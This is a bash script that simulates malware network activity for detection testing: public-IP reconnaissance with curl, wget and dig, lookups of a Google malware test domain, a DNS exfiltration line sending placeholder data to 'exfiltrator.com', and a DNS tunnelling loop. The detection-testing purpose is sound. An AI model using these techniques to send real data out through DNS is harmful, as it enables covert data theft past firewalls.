#!/bin/bash

# ================================
# Scenario: Malicious DNS Lookup & Public IP Reconnaissance
# Type: Network
# Description:
# Author: toquiwokey
# - Simulates malware querying external DNS services to determine its 
#   public IP address or contact a C2 (Command & Control) server.
# - Uses a combination of public IP checkers and a safe test domain 
#   (malware.testing.google.test) to mimic real-world malware behavior.
# - Security agents should detect:
#   - Unexpected outbound DNS queries
#   - Suspicious HTTP/S requests to known reconnaissance services
# ================================

# 1. Public IP Reconnaissance (Malware often does this to check its external IP)
curl -s http://icanhazip.com

# Alternative methods:
curl -s http://checkip.amazonaws.com
wget -qO- http://ifconfig.me
dig +short myip.opendns.com @resolver1.opendns.com

# 2. Query a Known Safe Malware Test Domain (Used to test detection tools)
nslookup malware.testing.google.test
dig @8.8.8.8 malware.testing.google.test

# 3. DNS Exfiltration Simulation (Encoded data in subdomains)
# - Some malware hides stolen data inside DNS queries to bypass firewalls.
# - This simulates a DNS exfiltration attempt.
dig exampledata123.exfiltrator.com @8.8.8.8

# 4. DNS Tunneling Attempt (Mimicking covert C2 communication)
# - Some malware establishes a C2 channel using DNS queries.
# - Here, we simulate repeated lookups of a random domain.
for i in {1..5}; do dig $(openssl rand -hex 6).malware.testing.google.test @8.8.8.8; done

